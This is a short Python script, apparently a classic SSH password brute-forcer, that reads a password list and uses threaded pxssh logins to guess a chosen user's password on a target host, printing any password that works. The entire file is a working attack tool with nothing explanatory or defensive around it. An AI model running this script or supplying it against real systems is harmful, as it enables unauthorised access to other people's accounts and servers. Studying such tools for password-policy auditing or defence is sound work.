from pexpect import pxssh
import argparse
import time
from threading import *

maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)

Found = False
Fails = 0

def connect(host, user, password, release):
    global Found
    global Fails

    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print('[+] Password Found: ' + password)
        Found = True

    except Exception as e:
        if 'read_nonblocking' in str(e):
            Fails += 1
            time.sleep(5)
            connect(host, user, password, False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, user, password, False)

    finally:
        if release:
            connection_lock.release()

def main():
    parser = argparse.ArgumentParser(description='ssh bruteforcer')
    parser.add_argument('-H', dest='tgtHost', type=str,help='specify target host',required=True)
    parser.add_argument('-F', dest='passwdFile', type=str,help='specify password file',required=True)
    parser.add_argument('-u', dest='user', type=str,help='specify the user',required=True)

    args = parser.parse_args()
    host = args.tgtHost
    passwdFile = args.passwdFile
    user = args.user

    fn = open(passwdFile, 'r')
    for line in fn.readlines():
        if Found:
            print("[*] Exiting: Password Found")
            exit(0)
        if Fails > 5:
            print("[!] Exiting: Too Many Socket Timeouts")
            exit(0)
        connection_lock.acquire()
        password = line.strip('\r').strip('\n')
        print("[-] Testing: "+str(password))
        t = Thread(target=connect, args=(host, user, password, True))
        child = t.start()
    fn.close()

if __name__ == '__main__':
    main()